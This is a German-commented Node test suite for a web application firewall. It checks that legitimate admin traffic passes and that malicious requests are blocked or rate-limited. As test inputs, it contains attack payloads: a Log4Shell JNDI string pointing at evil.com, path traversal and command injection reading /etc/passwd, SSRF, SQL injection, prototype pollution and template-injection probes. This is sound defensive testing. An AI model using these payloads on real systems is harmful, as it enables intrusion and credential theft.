/**
 * Firewall-WAF: prüft, dass bösartige Anfragen blockiert werden UND legitimer
 * Admin-Traffic durchgelassen wird (keine False-Positives) + Rate-Limit greift.
 * DB-/Env-frei — reine Edge-Logik.
 */
import { test } from "node:test";
import assert from "node:assert/strict";

import { bewerteAnfrage, clientIp, sicherheitsHeader } from "../src/lib/firewall";

const NOW = 1_000_000;
const basis = { ip: "5.5.5.1", method: "GET", ua: "Mozilla/5.0", search: "" };

test("legitimer Admin-Traffic wird NICHT blockiert", () => {
  assert.equal(bewerteAnfrage({ ...basis, pathname: "/kandidaten" }, NOW), null);
  assert.equal(
    bewerteAnfrage(
      { ...basis, ip: "5.5.5.2", pathname: "/unternehmen", search: "?q=Elektriker&page=2&sort=name" },
      NOW,
    ),
    null,
  );
  assert.equal(
    bewerteAnfrage({ ...basis, ip: "5.5.5.3", pathname: "/api/chat", method: "POST" }, NOW),
    null,
  );
});

test("Exploit-Pfade werden blockiert", () => {
  for (const p of ["/.env", "/wp-login.php", "/phpmyadmin/index.php", "/backup.sql"]) {
    const u = bewerteAnfrage({ ...basis, ip: "6.0.0.1", pathname: p }, NOW);
    assert.ok(u?.block, `Pfad sollte blockieren: ${p}`);
    assert.equal(u?.status, 403);
  }
});

test("Path-Traversal wird blockiert", () => {
  const u = bewerteAnfrage({ ...basis, ip: "6.0.0.2", pathname: "/x/..%2f..%2fetc/passwd" }, NOW);
  assert.ok(u?.block);
});

test("Scanner-User-Agents werden blockiert", () => {
  const u = bewerteAnfrage({ ...basis, ip: "6.0.0.3", pathname: "/", ua: "sqlmap/1.7" }, NOW);
  assert.equal(u?.reason, "scanner_ua");
});

test("Injection-Signaturen im Query werden blockiert", () => {
  const u = bewerteAnfrage(
    { ...basis, ip: "6.0.0.4", pathname: "/", search: "?x=union%20select%20password" },
    NOW,
  );
  assert.equal(u?.reason, "injection_query");
});

test("verbotene Methoden werden blockiert", () => {
  const u = bewerteAnfrage({ ...basis, ip: "6.0.0.5", pathname: "/", method: "TRACE" }, NOW);
  assert.ok(u?.block);
});

test("Rate-Limit greift nach Überschreitung", () => {
  const ip = "7.7.7.7";
  let letztes = null;
  for (let i = 0; i < 241; i++) {
    letztes = bewerteAnfrage({ ...basis, ip, pathname: "/dashboard" }, NOW);
  }
  assert.equal(letztes?.action, "RATE_LIMIT");
  assert.equal(letztes?.status, 429);
});

test("clientIp liest x-forwarded-for (erste IP)", () => {
  const h = new Map([["x-forwarded-for", "203.0.113.9, 10.0.0.1"]]);
  assert.equal(clientIp((n) => h.get(n) ?? null), "203.0.113.9");
});

test("clientIp bevorzugt vertrauenswürdiges x-real-ip (Anti-Spoofing)", () => {
  // Angreifer prependet fremde IP in x-forwarded-for → x-real-ip (Vercel) gewinnt.
  const h = new Map([
    ["x-forwarded-for", "1.1.1.1"],
    ["x-real-ip", "203.0.113.50"],
  ]);
  assert.equal(clientIp((n) => h.get(n) ?? null), "203.0.113.50");
});

test("Log4Shell im User-Agent wird blockiert", () => {
  const u = bewerteAnfrage(
    { ...basis, ip: "6.1.0.1", pathname: "/", ua: "${jndi:ldap://evil.com/x}" },
    NOW,
  );
  assert.equal(u?.reason, "header_injection");
});

test("Null-Byte im Pfad wird blockiert", () => {
  const u = bewerteAnfrage({ ...basis, ip: "6.1.0.2", pathname: "/datei%00.png" }, NOW);
  assert.ok(u?.block);
});

test("doppelt kodierte Traversal wird blockiert", () => {
  const u = bewerteAnfrage(
    { ...basis, ip: "6.1.0.3", pathname: "/x/%252e%252e%252fetc/passwd" },
    NOW,
  );
  assert.ok(u?.block);
});

test("SSRF/Command-Injection im Query wird blockiert", () => {
  assert.ok(
    bewerteAnfrage({ ...basis, ip: "6.1.0.4", pathname: "/", search: "?url=file:///etc/passwd" }, NOW)?.block,
  );
  assert.ok(
    bewerteAnfrage({ ...basis, ip: "6.1.0.5", pathname: "/", search: "?x=;cat%20/etc/passwd" }, NOW)?.block,
  );
});

test("normaler Browser-UA löst KEINEN header_injection aus", () => {
  const u = bewerteAnfrage(
    {
      ...basis,
      ip: "6.1.0.6",
      pathname: "/dashboard",
      ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      referer: "https://werkpair.example/kandidaten",
    },
    NOW,
  );
  assert.equal(u, null);
});

test("CSRF: fremder Origin auf API-POST wird blockiert", () => {
  const u = bewerteAnfrage(
    {
      ...basis,
      ip: "6.2.0.1",
      pathname: "/api/chat",
      method: "POST",
      origin: "https://evil.example",
      host: "werkpair.example",
    },
    NOW,
  );
  assert.equal(u?.reason, "csrf_origin");
});

test("CSRF: gleicher Origin (same-site) wird durchgelassen", () => {
  const u = bewerteAnfrage(
    {
      ...basis,
      ip: "6.2.0.2",
      pathname: "/api/chat",
      method: "POST",
      origin: "https://werkpair.example",
      host: "werkpair.example",
    },
    NOW,
  );
  assert.equal(u, null);
});

test("CSRF: Server-zu-Server ohne Origin bleibt erlaubt", () => {
  const u = bewerteAnfrage(
    { ...basis, ip: "6.2.0.3", pathname: "/api/mcp", method: "POST", host: "werkpair.example" },
    NOW,
  );
  assert.equal(u, null);
});

test("Prototype-Pollution / SSTI im Query wird blockiert", () => {
  assert.ok(bewerteAnfrage({ ...basis, ip: "6.2.0.4", pathname: "/", search: "?__proto__[x]=1" }, NOW)?.block);
  assert.ok(bewerteAnfrage({ ...basis, ip: "6.2.0.5", pathname: "/", search: "?q={{7*7}}" }, NOW)?.block);
});

test("überlange Eingaben verursachen keinen Absturz (Längen-Cap)", () => {
  const riesig = "a".repeat(200_000);
  const u = bewerteAnfrage(
    { ...basis, ip: "6.2.0.6", pathname: "/kandidaten", search: `?q=${riesig}`, ua: riesig },
    NOW,
  );
  assert.equal(u, null); // harmloser Riesen-Input → kein Block, kein Fehler
});

test("Security-Header enthalten CSP-Struktur + HSTS (https)", () => {
  const h = sicherheitsHeader(true);
  assert.match(h["Content-Security-Policy"], /frame-ancestors 'self'/);
  assert.match(h["Content-Security-Policy"], /object-src 'none'/);
  assert.ok(h["Strict-Transport-Security"]);
  assert.equal(h["X-Content-Type-Options"], "nosniff");
});
